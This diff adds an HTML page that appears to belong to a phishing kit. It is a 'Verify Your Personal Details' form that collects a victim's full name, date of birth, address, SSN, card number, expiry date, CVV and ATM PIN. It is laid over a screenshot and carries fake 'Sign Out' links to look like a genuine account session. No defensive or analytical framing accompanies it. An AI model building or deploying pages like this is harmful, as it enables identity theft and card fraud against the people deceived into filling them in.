@@ -1,0 +1,77 @@
+<!doctype html>
+<html dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>Untitled Page</title>
+<meta name="generator" content="WYSIWYG Web Builder 17 Trial Version - https://www.wysiwygwebbuilder.com">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="Untitled2.css" rel="stylesheet">
+<link href="page1.css" rel="stylesheet">
+<script src="jquery-1.12.4.min.js"></script>
+<script src="jquery-ui.min.js"></script>
+<script src="jquery.ui.effect-blast.min.js"></script>
+<script src="wb.carousel.effects.min.js"></script>
+<script>
+$(document).ready(function()
+{
+   var Carousel1Opts =
+   {
+      delay: 0,
+      duration: 500,
+      easing: 'linear',
+      mode: 'flip-x',
+      direction: '',
+      scalemode: 2,
+      pagination: true,
+      pause: null,
+      start: 0
+   };
+   $("#wb_Carousel1").attr('dir', 'ltr');
+   $("#Carousel1").carouseleffects(Carousel1Opts);
+});
+</script>
+</head>
+<body>
+<a href="https://www.wysiwygwebbuilder.com" target="_blank"><img src="images/builtwithwwb17.png" alt="WYSIWYG Web Builder" style="position:absolute;left:441px;top:967px;margin: 0;border-width:0;z-index:250"></a>
+<hr id="Line1">
+<hr id="Line2">
+<div id="wb_Image1">
+<img src="images/Screenshot 2022-01-23 093412.png" id="Image1" alt=""></div>
+<div id="wb_Carousel1">
+<div id="Carousel1">
+<div class="frame">
+<div id="wb_Text1" dir="rtl">
+<span style="color:#000000;font-family:Arial;font-size:11px;">Verify Personal Details</span></div>
+<div id="wb_Text2" dir="rtl">
+<span style="color:#000000;font-family:Arial;font-size:24px;">Verify Your Personal Details</span></div>
+<input type="text" id="Editbox1" name="Name" value="" spellcheck="false" placeholder="full name">
+<input type="text" id="Editbox2" name="DOB" value="" spellcheck="false" placeholder="Dob (mm/dd/yy)">
+<input type="text" id="Editbox3" name="Address" value="" spellcheck="false" placeholder="Address">
+<input type="text" id="Editbox4" name="CIty" value="" spellcheck="false" placeholder="City">
+<input type="text" id="Editbox5" name="State" value="" spellcheck="false" placeholder="State">
+<input type="text" id="Editbox6" name="Zip" value="" spellcheck="false" placeholder="Zip">
+<input type="text" id="Editbox7" name="SSN" value="" spellcheck="false" placeholder="SSN no.">
+<input type="submit" id="btnNext" onclick="$('#Carousel1').carouseleffects('next');return false;" name="" value="Next">
+</div>
+<div class="frame" style="display:none">
+<div id="wb_Text6" dir="rtl">
+<span style="color:#000000;font-family:Arial;font-size:19px;">Verify Your Card Details</span></div>
+<div id="wb_Text7" dir="rtl">
+<span style="color:#000000;font-family:Arial;font-size:13px;">Verify Your Card </span></div>
+<input type="text" id="Editbox8" name="16 Digit Card No." value="" spellcheck="false" placeholder="16 Digit Card No.">
+<input type="text" id="Editbox9" name="EXP (mm/yy)" value="" spellcheck="false" placeholder="EXP (mm/yy)">
+<input type="text" id="Editbox10" name="CVV" value="" spellcheck="false" placeholder="CVV">
+<input type="text" id="Editbox11" name="ATM PIN" value="" spellcheck="false" placeholder="ATM PIN">
+<input type="submit" id="Button1" onclick="$('#Carousel1').carouseleffects('prev');return false;" name="" value="Previous">
+<input type="submit" id="Button2" onclick="document.getElementById('Carousel1').submit();window.location.href='./page2.html';return false;" name="" value="Submit">
+</div>
+</div>
+</div>
+<div id="wb_Text3" dir="rtl" onclick="window.location.href='./index.html';return false;">
+<span style="background-color:#FFFFFF;color:#FFFFFF;font-family:Arial;font-size:16px;line-height:19px;"><strong>Sign Out</strong></span></div>
+<div id="wb_Text4" dir="rtl" onclick="window.location.href='./index.html';return false;">
+<span style="background-color:#FFFFFF;color:#000000;font-family:Arial;font-size:13px;"><strong>Sign out</strong></span></div>
+<div id="wb_Text5" dir="rtl" onclick="window.location.href='./index.html';return false;">
+<span style="color:#FFFFFF;font-family:Arial;font-size:8px;">Sign Out</span></div>
+</body>
+</html>
